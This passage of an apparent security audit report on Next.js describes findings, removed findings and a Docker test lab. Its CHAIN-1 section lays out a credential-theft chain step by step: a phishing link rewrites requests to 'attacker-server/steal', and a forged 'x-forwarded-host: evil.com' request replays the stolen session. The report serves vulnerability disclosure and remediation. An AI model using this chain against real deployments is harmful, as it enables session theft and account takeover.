- Response header `x-middleware-skip: 1` — internal bypass mechanism header leaked

**Remediation:**

Add `x-middleware-prefetch` to the `INTERNAL_HEADERS` array in `packages/next/src/server/lib/server-ipc/utils.ts`. This ensures the header is stripped from all incoming external requests before any processing, while still allowing legitimate internal prefetch requests from Next.js's own client-side router to function correctly (those requests are generated server-side and do not pass through the external header filter).

---

## Exploit Chains

The following chain combines individual vulnerabilities into an end-to-end attack scenario demonstrating critical real-world impact.

| Chain | Title | Severity | Components |
|-------|-------|----------|------------|
| CHAIN-1 | Credential Theft to Account Takeover | Critical | VULN-8 + VULN-7 |

---

### CHAIN-1: Credential Theft to Account Takeover

**Severity:** Critical

**Components:** VULN-8 (Middleware Rewrite SSRF with Credential Forwarding) + VULN-7 (Server Action CSRF Bypass via x-forwarded-host)

**Attack Narrative:**

An attacker sends a victim a phishing link pointing to the target Next.js application with a crafted `?backend=` parameter. The middleware unconditionally rewrites the request to the attacker's credential capture server, and `proxyRequest` forwards all of the victim's headers — including their session cookie and authorization token — to the attacker's server. The attacker then replays the stolen session cookie in a cross-origin server action request, injecting `x-forwarded-host: evil.com` alongside `Origin: https://evil.com` to satisfy the CSRF host-match check. The server action executes with the victim's identity, enabling account takeover with a single phishing click.

**Attack Flow:**

1. Victim clicks phishing link: `http://target.com/?backend=http://attacker-server/steal` with session cookie and Authorization header present in browser.
2. Middleware (VULN-8) rewrites request to `attacker-server/steal`; `proxyRequest` forwards `Cookie: session=VICTIM_TOKEN` and `Authorization: Bearer VICTIM_KEY`.
3. Attacker reads captured credentials from capture server logs (`CREDENTIAL_CAPTURED` entries).
4. Attacker posts to `http://target.com/` with `Next-Action: <id>`, `Cookie: session=VICTIM_TOKEN`, `Origin: https://evil.com`, `x-forwarded-host: evil.com` — CSRF check passes because `parseHostHeader` reads `x-forwarded-host` as the host value (VULN-7), matching the forged Origin.
5. Server action executes on behalf of the victim's session.

**Reproduction:**

```bash
bash autofyn_audit/exploits/chain_credential_theft_account_takeover.sh
```

**Evidence:**

- Step 1 confirms middleware rewrites victim request to capture server (HTTP 200).
- Step 2 confirms `CREDENTIAL_CAPTURED` lines containing chain-unique markers appear in `docker logs audit-credential-capture`.
- Step 4 confirms HTTP 200 with no `Invalid Server Actions request` in the body — CSRF bypass succeeded with stolen session.

**Real-World Impact:**

No vulnerability in isolation is as severe as their combination. VULN-8 alone requires the attacker to steal credentials; VULN-7 alone requires the attacker to already have credentials. Together they form a complete account takeover chain: a single phishing link harvests a victim's session and immediately leverages it to perform privileged server-side mutations. Any authenticated user who clicks a crafted link is fully compromised.

---

## Appendix A: Informational Notes

### INFO-1: Server Actions Execute Without Origin Header (intentional defense-in-depth gap)

**Classification:** Informational — explicitly documented intentional behavior, not a vulnerability

**Affected Code:**
- `packages/next/src/server/app-render/action-handler.ts:646-651`

Server Actions allow requests without an `Origin` header, logging a warning but proceeding with execution. The source code contains an explicit comment documenting the design rationale:

> "This is a handcrafted request without an origin or a request from an unsafe browser. We'll let this through but log a warning. We can't guard against unsafe browsers and handcrafted requests can't contain user credentials that haven't been shared willingly."

This is standard CSRF protection design — browser-originated cross-site requests always include `Origin`, and the check handles that case. Blocking missing-Origin requests would break legitimate non-browser API clients (curl, server-to-server calls, older browsers, privacy extensions). Django, Rails, and Laravel all have similar "no origin = allow" patterns.

**Residual risk:** In environments where a compromised proxy strips `Origin` headers before they reach Next.js, the CSRF check is bypassed — but the proxy compromise is already a severe condition.

---

## Appendix B: Removed Findings (Verification Notes)

The following findings were present in the initial draft but removed during adversarial review. They are documented here for transparency.

### VULN-2: Auth Bypass via Internal Header Injection (NEXT_PRIVATE_TEST_HEADERS) — REMOVED

**Reason for removal:** `NEXT_PRIVATE_TEST_HEADERS` is an explicitly labeled test-only env var (`PRIVATE` in the name signals internal use). Setting it in production is a user configuration error, not a framework vulnerability. The variable disables `filterInternalHeaders()`, which is its intended purpose for test environments. Filing this as a security finding is equivalent to reporting that `NODE_ENV=development` in production exposes debug endpoints. No maintainer would accept this.

### VULN-5: Unauthenticated V8 Inspector Open via Dev Endpoint — REMOVED

**Reason for removal:** The `/__nextjs_attach-nodejs-inspector` endpoint calls `inspector.open()`, which is the standard Node.js debugging API. The default binding is `127.0.0.1:9229` (localhost only) — this is Node.js's security boundary, not Next.js's responsibility. This is dev-mode-only tooling that exists to support the Next.js DevTools experience. Every dev server in the ecosystem (webpack-dev-server, Vite, etc.) provides equivalent debug capabilities. The PoC required `--inspect=0.0.0.0:9229` to simulate network accessibility, which is a non-default user configuration.

### CHAIN-2: Browser Visit to Full RCE (dev mode) — REMOVED

**Reason for removal:** This chain combined VULN-9 (DNS rebinding, retained as Medium) with VULN-5 (inspector, removed). With VULN-5 removed, the chain's RCE component is gone. VULN-9 alone enables access to dev endpoints, but the practical impact is limited to reading source maps and file existence oracles — capabilities already covered by VULN-4 and VULN-6. The DNS rebinding bypass is genuine but its impact is adequately represented by the standalone VULN-9 finding.

### CHAIN-3: Route Discovery to Auth Bypass to SSRF Pivot — REMOVED

**Reason for removal:** The report honestly stated that "the components of CHAIN-3 are independently exploitable" and that their combination "demonstrates the breadth of unauthenticated attack surface rather than a single causal attack path." This is not a chain — it is three independent findings (VULN-11, VULN-3, VULN-1) listed together. VULN-3 was further demoted to informational (documented intentional behavior). Each remaining component (VULN-1 and VULN-11) is adequately covered as a standalone finding.

---

## Appendix C: Test Environment

```
audit-net (Docker bridge network)
  |
  +-- audit-nextjs-app (3000:3000) — next start, production mode
  +-- audit-nextjs-app-test-headers (3001:3000) — next start, NEXT_PRIVATE_TEST_HEADERS=1
  +-- audit-nextjs-dev (3002:3000, 9230:9229) — next dev --webpack, NODE_OPTIONS=--inspect=0.0.0.0:9229
  +-- audit-middleware-app (3003:3000) — next start, production mode, middleware SSRF target
  +-- audit-edge-app (3004:3000) — next start, production mode, edge runtime server actions
  +-- audit-redirect-server (8080:8080) — issues 302 redirect to secret server
  +-- audit-secret-server (9090:9090) — serves JPEG, logs access
  +-- audit-credential-capture (9091:9091) — logs captured Cookie+Authorization headers
```

To reproduce all retained findings (8 vulnerabilities + 1 exploit chain):
```bash
bash autofyn_audit/setup.sh
bash autofyn_audit/run_all_exploits.sh
bash autofyn_audit/teardown.sh
```

Note: The exploit suite still contains scripts for removed findings (VULN-2, VULN-5) and chains (CHAIN-2, CHAIN-3) for archival purposes. They all pass live but were excluded from the report based on adversarial threat-model review.
